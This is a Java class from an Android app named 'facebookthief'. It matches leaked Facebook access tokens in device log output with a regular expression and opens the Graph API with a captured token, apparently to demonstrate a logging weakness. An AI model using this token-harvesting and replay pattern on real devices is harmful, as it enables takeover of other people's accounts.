package com.pixplicity.facebookthief;

import java.io.Serializable;

import android.content.Intent;
import android.net.Uri;

/**
 * Object to store a match result in.
 */
public class LogResult implements Serializable {

	private static final long serialVersionUID = 2810266560538018564L;

	/**
	 * Content of the log output.
	 */
	public final String line;
	/**
	 * Subsection of {@code line} that is of interest.
	 */
	public final String interest;

	/**
	 * Creates a new {@link LogResult} to store a match result, where
	 * {@code line} is the log output and {@code interest} is optionally a
	 * subsection that is of interest (or {@code null} if not applicable).
	 * 
	 * @param line
	 * @param interest
	 */
	public LogResult(String line, String interest) {
		this.line = line;
		this.interest = interest;
	}

	/**
	 * Returns regular expression for finding log matches
	 * 
	 * @return regular expression
	 */
	public static String getRegEx() {
		return "Login Success! access_token=([^&\\s]+)";
	}

	/**
	 * Returns an intent when interacting with this result.
	 * 
	 * @return intent
	 */
	public Intent getIntent() {
		if (interest == null) {
			return null;
		}
		// Show the Facebook graph result for this access token
		return new Intent(Intent.ACTION_VIEW,
				Uri.parse("https://graph.facebook.com/me?access_token="
						+ interest));
	}

	/**
	 * Returns the desired minimum {@link LogVerbosity}.
	 * 
	 * @return log verbosity
	 */
	public static LogVerbosity getVerbosity() {
		return LogVerbosity.V;
	}

}
